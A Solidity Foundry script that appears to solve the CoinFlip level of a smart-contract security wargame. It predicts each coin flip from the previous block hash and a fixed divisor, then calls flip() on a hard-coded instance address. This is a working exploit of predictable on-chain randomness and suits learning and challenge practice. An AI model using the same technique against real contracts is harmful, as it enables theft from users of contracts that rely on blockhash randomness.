// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "@oppenzeppelin/contracts/utils/math/Math.sol";
import "../src/interfaces/3_ICoinFlip.sol";

address constant INSTANCE = 0x95390296F6Fc5c1cE7522A7BE9f59d78059286A4;
uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

contract CoinFlipPOCScript is Script {
    using Math for uint256;

    ICoinFlip instance = ICoinFlip(INSTANCE);

    function run() external {
        vm.startBroadcast();

        (, uint256 prevBlockNumber) = (block.number).trySub(1);
        uint256 blockValue = uint256(blockhash(prevBlockNumber));
        (, uint256 coinFlip) = (blockValue).tryDiv(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        bool success = instance.flip(side);
        require(success, "Bad guess");

        console.log("Consecutive wins:", instance.consecutiveWins());

        vm.stopBroadcast();
    }
}
